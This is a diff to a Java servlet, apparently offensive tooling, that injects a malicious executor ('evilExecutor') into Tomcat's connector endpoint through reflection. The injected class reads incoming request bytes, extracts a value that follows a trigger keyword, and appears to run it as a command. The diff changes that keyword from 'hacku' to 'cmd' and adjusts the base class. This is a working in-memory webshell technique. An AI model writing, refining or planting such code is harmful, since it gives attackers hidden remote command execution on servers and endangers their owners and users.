@@ -42,7 +42,8 @@ public class InjectExecutor extends HttpServlet {
                     exec.getThreadFactory(),
                     exec.getRejectedExecutionHandler());
             endpoint.setExecutor(exe);
-        } catch (ClassCastException e) {
+        } catch (ClassCastException e)
+        {
             System.out.println("触发java.lang.ClassCastException");
             StandardThreadExecutor standardexec = (StandardThreadExecutor) getField(endpoint, "executor");
             ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(standardexec, "executor");
@@ -60,7 +61,7 @@ public class InjectExecutor extends HttpServlet {
 
     }
 
-    class evilExecutor extends ThreadPoolExecutor {
+    class evilExecutor extends org.apache.tomcat.util.threads.ThreadPoolExecutor {
 
         public evilExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
             super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
@@ -81,8 +82,8 @@ public class InjectExecutor extends HttpServlet {
                 readBuffer.put(byteBuffer);
                 readBuffer.reset();
                 String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
-                if (a.contains("hacku")) {
-                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
+                if (a.contains("cmd")) {
+                    String b = a.substring(a.indexOf("cmd") + "cmd".length() + 1, a.indexOf("\r", a.indexOf("cmd"))).trim();
                     System.out.println(b);
                     if (b.length() > 1) {
                         try {
